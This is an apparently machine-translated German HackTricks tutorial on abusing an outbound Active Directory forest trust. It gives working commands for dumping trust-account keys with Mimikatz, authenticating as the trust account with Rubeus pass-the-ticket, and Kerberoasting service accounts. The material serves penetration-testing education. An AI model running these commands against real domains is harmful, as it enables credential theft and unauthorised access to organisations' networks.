# Externe Wald-Domäne - Einweg (Ausgehend)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

In diesem Szenario **vertraut Ihre Domäne** bestimmte **Privilegien** einem Prinzipal aus **anderen Domänen** an.

## Enumeration

### Ausgehendes Vertrauen
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Vertrauenskonto-Angriff

Eine Sicherheitslücke besteht, wenn eine Vertrauensbeziehung zwischen zwei Domänen hergestellt wird, die hier als Domäne **A** und Domäne **B** identifiziert sind, wobei Domäne **B** ihr Vertrauen auf Domäne **A** ausdehnt. In diesem Setup wird ein spezielles Konto in Domäne **A** für Domäne **B** erstellt, das eine entscheidende Rolle im Authentifizierungsprozess zwischen den beiden Domänen spielt. Dieses Konto, das mit Domäne **B** verbunden ist, wird zum Verschlüsseln von Tickets für den Zugriff auf Dienste in den Domänen verwendet.

Der entscheidende Aspekt hier ist, dass das Passwort und der Hash dieses speziellen Kontos mithilfe eines Befehlszeilentools von einem Domänencontroller in Domäne **A** extrahiert werden können. Der Befehl zum Ausführen dieser Aktion lautet:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Diese Extraktion ist möglich, da das Konto, das mit einem **$** nach seinem Namen identifiziert ist, aktiv ist und zur Gruppe "Domänenbenutzer" der Domäne **A** gehört, wodurch Berechtigungen, die mit dieser Gruppe verbunden sind, vererbt werden. Dies ermöglicht es Personen, sich gegen die Domäne **A** mit den Anmeldeinformationen dieses Kontos zu authentifizieren.

**Warnung:** Es ist möglich, diese Situation auszunutzen, um in der Domäne **A** als Benutzer Fuß zu fassen, wenn auch mit eingeschränkten Berechtigungen. Dieser Zugriff ist jedoch ausreichend, um eine Aufzählung in der Domäne **A** durchzuführen.

In einem Szenario, in dem `ext.local` die vertrauende Domäne und `root.local` die vertraute Domäne ist, würde ein Benutzerkonto mit dem Namen `EXT$` innerhalb von `root.local` erstellt. Durch spezifische Tools ist es möglich, die Kerberos-Vertrauensschlüssel abzurufen, um die Anmeldeinformationen von `EXT$` in `root.local` offenzulegen. Der Befehl, um dies zu erreichen, lautet:
```bash
lsadump::trust /patch
```
Nachfolgend könnte man den extrahierten RC4-Schlüssel verwenden, um sich als `root.local\EXT$` innerhalb von `root.local` mit einem anderen Befehlswerkzeug zu authentifizieren:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Diese Authentifizierungsschritt eröffnet die Möglichkeit, Dienste innerhalb von `root.local` aufzulisten und sogar auszunutzen, z. B. durchführen eines Kerberoast-Angriffs zum Extrahieren von Servicekontozugangsdaten mit:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Sammeln des Klartext-Vertrauenspassworts

Im vorherigen Ablauf wurde anstelle des **Klartextpassworts** (das auch von mimikatz **ausgelesen wurde**) der Vertrauenshash verwendet.

Das Klartextpasswort kann erhalten werden, indem der \[ CLEAR \]-Ausgabe von mimikatz von hexadezimal in Klartext umgewandelt und Nullbytes '\x00' entfernt werden:

![](<../../.gitbook/assets/image (938).png>)

Manchmal muss bei der Erstellung einer Vertrauensbeziehung ein Passwort vom Benutzer für das Vertrauen eingegeben werden. In dieser Demonstration ist der Schlüssel das ursprüngliche Vertrauenspasswort und daher menschenlesbar. Da der Schlüssel zyklisch ist (30 Tage), wird der Klartext nicht menschenlesbar sein, aber technisch immer noch verwendbar.

Das Klartextpasswort kann verwendet werden, um eine reguläre Authentifizierung als das Vertrauenskonto durchzuführen, eine Alternative zum Anfordern eines TGT unter Verwendung des Kerberos-Geheimschlüssels des Vertrauenskontos. Hier wird root.local von ext.local nach Mitgliedern der Domänenadministratoren abgefragt:

![](<../../.gitbook/assets/image (792).png>)

## Referenzen

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
